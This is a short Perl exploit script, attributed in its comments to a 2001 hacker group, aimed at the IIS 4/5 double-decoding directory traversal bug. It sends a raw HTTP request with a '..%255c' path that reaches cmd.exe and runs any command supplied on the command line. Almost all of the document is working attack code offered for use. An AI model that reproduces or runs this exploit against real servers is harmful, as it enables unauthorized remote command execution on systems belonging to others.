#!/usr/bin/perl
# Made on 19.05.2001 by SHT (Serbian Hacker Team)
# - by : **W**
# This little piece of code try's to exploit the double decoding BUG on IIS 4 & 5
# Its maybe even easyer to do this in browser but i remember me @ start (newbie)
# # Anyways here it is.

use Socket;

if ($#ARGV<1) {die "Syntax: cgidecode IP:port command\n";}
($host,$port)=split(/:/,@ARGV[0]);
$host = inet_aton($host);
$cmd=@ARGV[1];

my @results=sendraw("GET /scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+$cmd HTTP/1.0\r\n\r\n");
print @results;

sub sendraw { 
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$host)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Unable to connect...\n"); }
}


